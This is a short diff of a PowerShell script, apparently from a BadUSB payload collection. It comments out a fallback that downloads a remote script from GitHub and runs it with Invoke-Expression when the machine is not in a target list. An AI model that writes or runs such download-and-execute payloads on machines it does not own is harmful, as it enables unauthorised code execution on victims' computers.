@@ -20,10 +20,10 @@ $computerName = $env:COMPUTERNAME
 $target = $people | Where-Object { $_.Computer -eq $computerName }
 
 # Si la personne n'a pas été trouvée, fallback sur le script ScreenLockPolice
-if ($null -eq $target) {
+<# if ($null -eq $target) {
     Invoke-Expression (Invoke-WebRequest 'https://raw.githubusercontent.com/MagikarpLv13/bad_usb_payloads/master/ScreenLockPolice/script.ps1')
     exit
-}
+} #>
 
 # Actualiser la liste des personnes
 $people = $people | Where-Object { $_.Computer -ne $computerName }
